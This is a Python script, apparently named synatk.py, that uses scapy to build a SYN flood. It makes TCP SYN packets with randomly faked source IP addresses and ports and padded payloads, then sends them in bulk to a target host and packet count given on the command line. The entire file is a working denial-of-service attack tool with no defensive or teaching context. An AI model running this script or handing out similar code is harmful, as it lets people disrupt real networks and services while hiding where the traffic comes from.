from scapy.all import *
import sys
import time
from faker import Faker

fake = Faker()

def atk(target, size, seq):

    ip = IP()
    tcp = TCP()
    
    spoof = fake.ipv4()
    spoofport = RandShort()

    payload = raw(b'X'*size)

    ip.dst = target
    ip.src = spoof
    tcp.sport = spoofport
    tcp.flags = 'S'
    tcp.window = 8
    tcp.seq = seq
    packet = ip / tcp / payload
    return packet

def flood(dest, size, num_packets):
    # these are just values I pulled out of my ass but its ok cuz its just sequence stuff
    counter = random.randint(6,91)
    ceiling = random.randint(100, 9001)
    pkts = []

    proctime = time.process_time()

    print(f'making {num_packets} packets...')
    for i in range(0, num_packets+1):
        pkt = atk(dest, size, counter)
        counter += 1
        pkts.append(pkt)
        if counter == ceiling:
            counter = random.randint(0,91)

    proctime = time.process_time()-proctime
    print(f'Done in {proctime} sec')

    print(f'flooding {dest}...')
    for pkt in pkts:
        thread = threading.Thread(target=send(pkt, verbose = 0))
        thread.start()

    proctime = time.process_time()-proctime
    print(f'Done in {proctime} sec')
    

if len(sys.argv) != 4:
    print('USAGE: synatk.py <FQDN or ip> <size of packets in bytes> <number of packets>')
    sys.exit(1)
dest = sys.argv[1]
size = sys.argv[2]
num_packets = sys.argv[3]
try:
        size = int(size)
except:
        sys.exit('Invalid size of packets')
try:
        num_packets = int(num_packets)
except:
        sys.exit('Invalid number of packets')


flood(dest=dest, size=size, num_packets=num_packets)